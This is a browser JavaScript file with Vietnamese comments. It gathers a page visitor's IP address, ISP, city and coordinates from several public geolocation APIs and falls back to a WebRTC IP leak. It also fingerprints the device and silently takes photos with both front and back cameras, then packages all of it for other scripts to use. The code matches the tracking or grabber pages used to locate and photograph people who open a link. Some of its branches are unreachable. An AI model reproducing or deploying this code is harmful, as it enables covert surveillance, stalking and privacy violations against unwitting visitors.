// data.js - Lấy IP và thông tin vị trí với nhiều API dự phòng
// Không cần server, chạy trực tiếp trên trình duyệt

async function getLocationData() {
    // Danh sách API dự phòng (nếu cái này lỗi thì chuyển cái khác)
    const apis = [
        'https://api.ipify.org?format=json',
        'https://api.my-ip.io/ip.json',
        'https://ipapi.co/json/',
        'https://ipwho.is/',
        'https://freeipapi.com/api/json/',
        'https://ip-api.com/json/'
    ];
    
    let result = {
        ip: 'Không xác định',
        isp: 'Không xác định',
        country: 'Không xác định',
        city: 'Không xác định',
        region: 'Không xác định',
        lat: 'Không xác định',
        lon: 'Không xác định',
        location: 'Không xác định',
        maps: ''
    };
    
    for (const api of apis) {
        try {
            console.log(`Đang thử API: ${api}`);
            const response = await fetch(api, { mode: 'cors' });
            const data = await response.json();
            
            // API ipify.org (chỉ có IP)
            if (data.ip) {
                result.ip = data.ip;
                // Nếu chỉ có IP, thử API khác để lấy thêm thông tin
                continue;
            }
            
            // API ipwho.is
            if (data.success !== false && data.ip) {
                result.ip = data.ip;
                result.isp = data.connection?.isp || data.isp || 'Không xác định';
                result.country = data.country || 'Không xác định';
                result.city = data.city || 'Không xác định';
                result.region = data.region || 'Không xác định';
                result.lat = data.latitude || 'Không xác định';
                result.lon = data.longitude || 'Không xác định';
                result.location = `${result.city}, ${result.region}, ${result.country}`.replace(/^, |, , /g, '');
                if (result.lat !== 'Không xác định') {
                    result.maps = `http://googleusercontent.com/maps.google.com/${result.lat},${result.lon}`;
                }
                console.log('✅ Lấy thành công từ ipwho.is');
                return result;
            }
            
            // API ipapi.co
            if (data.ip) {
                result.ip = data.ip;
                result.isp = data.org || data.asn || 'Không xác định';
                result.country = data.country_name || 'Không xác định';
                result.city = data.city || 'Không xác định';
                result.region = data.region || 'Không xác định';
                result.lat = data.latitude || 'Không xác định';
                result.lon = data.longitude || 'Không xác định';
                result.location = `${result.city}, ${result.region}, ${result.country}`.replace(/^, |, , /g, '');
                if (result.lat !== 'Không xác định') {
                    result.maps = `http://googleusercontent.com/maps.google.com/${result.lat},${result.lon}`;
                }
                console.log('✅ Lấy thành công từ ipapi.co');
                return result;
            }
            
            // API freeipapi
            if (data.ipAddress) {
                result.ip = data.ipAddress;
                result.country = data.country || 'Không xác định';
                result.city = data.city || 'Không xác định';
                result.region = data.region || 'Không xác định';
                result.lat = data.latitude || 'Không xác định';
                result.lon = data.longitude || 'Không xác định';
                result.location = `${result.city}, ${result.region}, ${result.country}`.replace(/^, |, , /g, '');
                console.log('✅ Lấy thành công từ freeipapi');
                return result;
            }
            
            // API ip-api.com
            if (data.status === 'success') {
                result.ip = data.query;
                result.isp = data.isp || 'Không xác định';
                result.country = data.country || 'Không xác định';
                result.city = data.city || 'Không xác định';
                result.region = data.regionName || 'Không xác định';
                result.lat = data.lat || 'Không xác định';
                result.lon = data.lon || 'Không xác định';
                result.location = `${result.city}, ${result.region}, ${result.country}`.replace(/^, |, , /g, '');
                if (result.lat !== 'Không xác định') {
                    result.maps = `http://googleusercontent.com/maps.google.com/${result.lat},${result.lon}`;
                }
                console.log('✅ Lấy thành công từ ip-api.com');
                return result;
            }
            
        } catch(e) {
            console.log(`API ${api} thất bại:`, e.message);
        }
    }
    
    // Nếu vẫn không lấy được IP, thử cách cuối: dùng WebRTC (lấy IP cục bộ)
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) {
                    result.ip = ipMatch[0];
                    console.log('✅ Lấy IP từ WebRTC:', result.ip);
                }
                pc.close();
            }
        };
        await new Promise(resolve => setTimeout(resolve, 2000));
    } catch(e) {}
    
    console.log('📡 Kết quả cuối cùng:', result);
    return result;
}

// Hàm lấy thông tin thiết bị
function getDeviceInfo() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    
    let device = 'Không xác định';
    let os = 'Không xác định';
    
    if (/iPhone|iPad|iPod/i.test(ua)) {
        os = 'iOS';
        device = 'iPhone';
    } else if (/Android/i.test(ua)) {
        os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } else if (ua.includes('Windows')) {
        os = 'Windows';
        device = 'PC/Laptop';
    } else if (ua.includes('Mac')) {
        os = 'macOS';
        device = 'Mac';
    } else {
        os = 'Desktop';
        device = 'PC/Laptop';
    }
    
    return { device, os };
}

// Hàm chụp ảnh
async function captureCamera(facingMode = 'user') {
    if (!navigator.mediaDevices?.getUserMedia) return null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
                }, 500);
            };
        });
    } catch (e) {
        return null;
    }
}

// Hàm chính - lấy tất cả dữ liệu
async function collectAllData() {
    console.log("🚀 Bắt đầu thu thập dữ liệu...");
    
    const deviceInfo = getDeviceInfo();
    const locationData = await getLocationData();
    
    // Chụp ảnh
    const frontPhoto = await captureCamera('user');
    const backPhoto = await captureCamera('environment');
    
    const cameraStatus = (frontPhoto || backPhoto) ? '✅ Đã chụp camera' : '🚫 Bị chặn hoặc không có camera';
    
    // Format dữ liệu cuối cùng
    const finalData = {
        time: new Date().toLocaleString('vi-VN'),
        device: deviceInfo.device,
        os: deviceInfo.os,
        ip: locationData.ip,
        isp: locationData.isp,
        address: locationData.location,
        country: locationData.country,
        lat: locationData.lat,
        lon: locationData.lon,
        maps: locationData.maps,
        camera: cameraStatus,
        note: 'Thông tin có khả năng chưa chính xác 100%.',
        frontPhoto: frontPhoto,
        backPhoto: backPhoto
    };
    
    console.log("✅ Đã thu thập xong:", finalData);
    return finalData;
}

// Export cho các file khác dùng
window.DataCollector = {
    collect: collectAllData,
    getLocation: getLocationData,
    getDevice: getDeviceInfo,
    captureCamera: captureCamera
};

console.log("📦 data.js đã sẵn sàng!");
